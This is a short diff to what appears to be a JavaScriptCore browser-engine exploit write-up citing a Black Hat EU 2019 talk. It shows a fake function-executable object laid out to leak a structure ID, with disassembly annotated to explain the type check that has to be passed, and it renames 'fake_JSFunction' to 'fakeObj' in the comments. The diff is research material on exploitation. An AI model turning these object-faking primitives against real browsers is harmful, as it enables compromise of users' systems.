@@ -6,7 +6,7 @@ reference : https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-Th
 var fake_unlinked_function_executable = {
     isHostOrBuiltinFunction: u2f(0xdeadbeef),
     dummy1: 1, dummy2: 2, dummy3: 3, dummy4: 4, dummy5: 5, dummy6: 6, // identifier at +0x48 offset from jscell
-    func_string_pointer : {}, // set to fake_JSFunction object, , identifier layout = | length | flag | pointer(source code) |
+    func_string_pointer : {}, // set to fakeObj object, , identifier layout = | length | flag | pointer(source code) |
 };
 
 var fake_function_executable = {
@@ -37,7 +37,7 @@ print(func_str.charCodeAt(9));
     0x100c41b9b: 48 89 c3                       movq   %rax, %rbx
 	.....
     0x100c41baf: c3                             retq   
-    0x100c41bb0: 8a 43 05                       movb   0x5(%rbx), %al 						// %rbx=fake_JSFunction, check m_type in jscell
+    0x100c41bb0: 8a 43 05                       movb   0x5(%rbx), %al 						// %rbx=fakeObj, check m_type in jscell
     0x100c41bb3: 3c 1a                          cmpb   $0x1a, %al
     0x100c41bb5: 0f 84 a7 00 00 00              je     0x100c41c62               ; <+258>
     0x100c41bbb: 3c 19                          cmpb   $0x19, %al							// m_type must be 0x19 to leak structure id
